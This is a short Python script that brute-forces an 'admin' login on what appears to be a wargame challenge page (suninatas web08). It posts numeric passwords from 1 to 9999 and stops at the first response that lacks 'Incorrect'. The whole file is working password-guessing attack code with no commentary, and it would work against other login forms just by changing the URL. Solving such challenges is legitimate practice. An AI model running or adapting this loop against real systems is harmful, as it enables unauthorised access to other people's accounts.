import requests
url = 'http://suninatas.com/challenge/web08/web08.asp'

for i in range(1,10000):
	params = {
		'id':'admin',
		'pw':str(i)
	}
	response = requests.post(url,params)
	if 'Incorrect' in response.text:
		print(str(i))
	else:
		print(str(i))
		break
